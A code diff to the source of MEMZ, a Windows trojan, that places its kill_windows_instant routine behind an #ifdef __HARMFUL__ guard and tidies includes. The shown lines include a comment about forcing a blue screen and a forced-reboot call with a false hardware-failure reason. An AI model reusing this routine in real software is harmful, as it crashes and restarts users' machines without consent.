@@ -1,10 +1,8 @@
 #include <memz/overwatch.h>
 #include <memz/util.h>
 #include <memz/data.h>
-
 #include <TlHelp32.h>
 #include <Psapi.h>
-#include <Reason.h>
 
 static DWORD WINAPI rip_message_thread(LPVOID parameter)
 {
@@ -15,6 +13,7 @@ static DWORD WINAPI rip_message_thread(LPVOID parameter)
     return 0;
 }
 
+#ifdef __HARMFUL__
 static void kill_windows_instant()
 {
     // Try to force BSOD first
@@ -46,6 +45,7 @@ static void kill_windows_instant()
     // The actual restart
     ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
 }
+#endif
 
 static void kill_windows()
 {
@@ -103,6 +103,7 @@ static DWORD WINAPI overwatch_thread(LPVOID parameter)
 
         Sleep(10);
     }
+
     return 0;
 }
 
